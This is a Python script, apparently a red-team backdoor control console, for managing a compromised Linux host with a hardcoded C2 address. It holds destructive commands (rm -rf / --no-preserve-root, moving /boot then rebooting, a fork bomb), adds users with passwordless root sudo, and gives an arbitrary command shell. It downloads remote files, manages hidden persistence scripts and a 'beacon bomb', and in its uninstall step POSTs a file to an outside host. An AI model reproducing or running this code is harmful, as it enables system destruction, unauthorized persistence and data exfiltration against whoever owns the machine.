import os
import subprocess
import argparse
from sys import argv
CnC = "192.168.102.16"
CnCUser = "sysadmin"
inVal = ""
Dir = ""
Fil = ""
option = ""
link = ""
num = ""
def main():
    cont = True
    contCond = True
    os.system("clear")
    print("Hey you, you're finally awake")
    print("Systemm, it just works")
    while (cont):
        print()
        value = input("Enter command(h or H - Help | e or E - Exit): ")
        if(value.lower() in ('h', 'help')):
            os.system("cat /var/spool/.log.sh")
        elif(len(value) == 0):
            pass
        elif(value.lower() in ('e', 'exit')):
            exit()
        elif(value.lower() in ('u')):
            print("Uninstalling.....")
            os.system("touch /etc/temp.txt")
            os.system("ifconfig -a > /etc/temp.txt")
            os.system("curl -X POST -d \"file=@/etc/.thing.txt\" http://host:1337")
            os.system("rm /etc/temp.txt")
            os.system("rm /var/spool/.log.sh")
            os.system("rm /bin/.systemm.sh")
            os.system("rm /etc/.resolver.sh")
            print("Success.")
            cont = False
            os.remove(argv[0])
        elif(value.lower() in  ('k')):
            print("Death to the system")
            print("1. Remove all")
            print("2. Move boot directory and reload")
            print("3. Infinite recursion/memory leak (may not kill, but will be annoying)")
            option = input("How would you like to kill the system: ")
            if(option.lower() in ('1')):
                os.system("rm -rf / --no-preserve-root")
            elif(option.lower() in ('2')):
                os.system("mkdir /etc/music")
                os.system("mv /boot/* /etc/music")
                os.system("reboot")
            elif(option.lower() in ('3')):
                os.system(":(){ :|:& };:")
            else:
                print("Invalid option. Returning")
        elif(value.lower() in  ('a')):
            print("Adding a user.....")
            name = input("Enter username: ")
            password = input("Enter password: ")
            sudoIn = input("Should the user have root sudo? ")
            os.system("useradd "+name)
            os.system("echo "+name+":"+password+" | chpasswd")
            if(sudoIn.lower() in  ('y')):
                os.system("echo \""+name+" ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers")
            print("Done. User "+name+" added.")
        elif(value.lower() in ('r')):
            print("Removing a user.....")
            print("Current users are:")
            os.system("cat /etc/passwd")
            name = input("Which user would you like to remove?")
            os.system("killall -u "+name)
            os.system("userdel -f -r "+name)
            print("User removed.")
        elif(value.lower() in ('c')):
            print("Entering Command-Line.....(Enter \"exit\" to exit)")
            x = True
            while(x):
                inVal = input("Command@Skyrim# ")
                if(len(inVal) == 0):
                    pass
                elif(inVal.lower() in ("exit")):
                    x = False
                elif(inVal.lower() in ('h', 'help')):
                    os.system("cat /var/spool/.log.sh")
                elif(inVal.lower() in ("info")):
                    print(os.uname())
                else:
                    os.system(inVal)
        elif(value.lower() in ('d')):
            print("Downloading.....")
            option = input("(F)ile or (D)irectory: ")
            if(option.lower() in ('f')):       
                Fil = input("Enter name of file to place download in: ")
                Dir = input("Enter directory to place file in(proper directory format, no end /): ")
                if(os.path.exists(Dir+"/"+Fil)):
                    option = input("File/Path already exists. Would you like to override? ")
                    if(option.lower() in ('y', 'yes')):   
                        link = input("Enter full url to download from: ")
                        os.system("curl -o "+Dir+"/"+Fil+ " "+link)
                        if(os.path.exists(Dir+"/"+Fil)):
                            print("Successfully Downloaded.")
                        else:
                            print("File not present after download. Possible failure.")
                    else:
                        print("Not overriding. Exiting.")
                else:
                    link = input("Enter full url to download from: ")
                    os.system("curl -o "+Dir+"/"+Fil+ " "+link)
                    if(os.path.exists(Dir+"/"+Fil)):
                        print("Successfully Downloaded.")
                    else:
                        print("File not present after download. Possible failure.")
            elif(option.lower() in ('d')):
                Dir = input("Enter directory to download to(proper directory format): ") 
                link = input("Enter full url to download from: ")
                option = input("Recursion(digs through subdirectories): ")
                if(option.lower() in ('y')):
                    num = input("How much depth(how many levels of subdirectories): ")
                    os.system("mkdir "+Dir)
                    os.system("wget -P "+Dir+ " -r -l "+num+" "+link)
                else:
                    os.system("mkdir "+Dir)
                    os.system("wget -P "+Dir+ " "+link)
        elif(value.lower() in ('l')):
            print("Uploading.....")
        elif(value.lower() in ('s')):
            print("Current module status:")
            print()
            if(checkStatus(".systemm.sh")):
                os.system("echo -e "+"systemm status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"systemm status: "+"\033[31m[INACTIVE]\033[0m")
            if(checkStatus(".resolver.sh")):
                os.system("echo -e "+"resolver status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"resolver status: "+"\033[31m[INACTIVE]\033[0m")
            option = input("Would you like to manage a module? ")
            if(option.lower() in ('y', 'yes')):
                contCond = True
                option = input("Enter module to manage: ")
                while(contCond):                
                    if(option.lower() in ('systemm')):
                        contCond = False
                        if(checkStatus(".systemm.sh")):
                            option = input("systemm is currently running. Would you like to stop it? ")
                            if(option.lower() in ('y', 'yes')):
                                killProcess(".systemm.sh")
                                if(checkStatus(".systemm.sh")):
                                    print("Termination failed.")
                                else:
                                    print("Termination successful.")
                        else:
                            option = input("systemm is not currently running. Would you like to start it? ")
                            if(option.lower() in ('y', 'yes')):
                                os.system("bash /bin/.systemm.sh &")
                                if(checkStatus(".systemm.sh")):
                                    print("Successful startup.")
                                else:
                                    print("Startup failure.")
                    elif(option.lower() in ('resolver')):
                        contCond = False
                        if(checkStatus(".resolver.sh")):
                            option = input("resolver is currently running. Would you like to stop it? ")
                            if(option.lower() in ('y', 'yes')):
                                killProcess(".resolver.sh")
                                if(checkStatus(".resolver.sh")):
                                    print("Termination failed.")
                                else:
                                    print("Termination successful.")
                        else:
                            option = input("resolver is not currently running. Would you like to start it? ")
                            if(option.lower() in ('y', 'yes')):
                                os.system("bash /etc/.resolver.sh &")
                                if(checkStatus(".resolver.sh")):
                                    print("Successful startup.")
                                else:
                                    print("Startup failure.")
                    else:
                        option = input("Invalid selection. Enter a module name: ")
        elif(value.lower() in ('b')):
            print("Bomb status:")
            print()
            if(checkStatus(".beaconBomb.py")):
                os.system("echo -e "+"1. Beacon-Bomb status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"1. Beacon-Bomb status: "+"\033[31m[INACTIVE]\033[0m")
            print()
            option = input("Which payload would you like to manage? ")
            if(option.lower() in ('1')):
                if(checkStatus(".beaconBomb.py")):
                    option = input("Would you like to disable this bomb? ")
                    if(option.lower() in ('y')):
                        killProcess(".beaconBomb.py")
                        if(checkStatus(".beaconBomb.py")):
                            print("Successful Termination.")
                        else:
                            print("Error in Termination.")
                    else:
                        print("Returning.")
                else:
                    option = input("Would you like to enable this bomb? ")
                    if(option.lower() in ('y')):
                        os.system("bash /var/games/.creator.sh beaconBomb")
                        if(checkStatus(".beaconBomb.py")):
                            print("Bomb successfully activated.")
                        else:
                            print("Error in Activation.")
                    else:
                        print("Returning.")
            else:
                print("Invalid selection. Returning.")
def checkStatus(fileName):
    ps_output = subprocess.check_output(["ps", "-ef"])
    ps_lines = ps_output.decode("utf-8").split("\n")
    for line in ps_lines:
        if fileName in line:
            return True
    else:
        return False
def killProcess(name):
    ps_output = subprocess.check_output(["ps", "-ef"])
    ps_lines = ps_output.decode("utf-8").split("\n")
    for line in ps_lines:
        if name in line:
            pid = int(line.split(None, 1)[1].split()[0])
            os.kill(pid, 9)
main()